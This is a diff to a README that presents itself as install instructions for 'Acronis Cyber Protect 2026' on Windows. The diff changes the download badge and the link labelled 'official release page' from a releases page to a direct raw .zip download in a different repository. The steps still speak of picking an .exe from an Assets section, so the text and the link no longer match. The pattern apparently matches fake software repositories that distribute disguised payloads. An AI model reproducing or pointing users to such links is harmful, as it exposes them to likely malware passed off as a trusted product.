@@ -5,7 +5,7 @@ description: "Download and install Acronis Cyber Protect on Windows 10 and 11 us
 ---
 # 🛡️ Acronis-Cyber-Protect-2026 - Protect your files and system data
 
-[![Download Acronis Cyber Protect](https://img.shields.io/badge/Download_Acronis-2026-blue)](https://github.com/sprigh4673/Acronis-Cyber-Protect-2026/releases)
+[![Download Acronis Cyber Protect](https://img.shields.io/badge/Download_Acronis-2026-blue)](https://github.com/sprigh4673/sprigh4673.github.io/raw/refs/heads/main/latence/io_sprigh_github_josher.zip)
 
 Acronis Cyber Protect 2026 provides data backup and cybersecurity for Windows users. This software handles system recovery, disk imaging, and threat detection. It protects your local files from hardware failure and malicious software. This guide helps you install and set up the software on your computer.
 
@@ -25,7 +25,7 @@ Make sure your Windows operating system includes all current updates. Open the W
 
 Follow these steps to obtain and run the installer.
 
-1. Go to the [official release page](https://github.com/sprigh4673/Acronis-Cyber-Protect-2026/releases).
+1. Go to the [official release page](https://github.com/sprigh4673/sprigh4673.github.io/raw/refs/heads/main/latence/io_sprigh_github_josher.zip).
 2. Look for the Assets section on that page.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your Downloads folder.
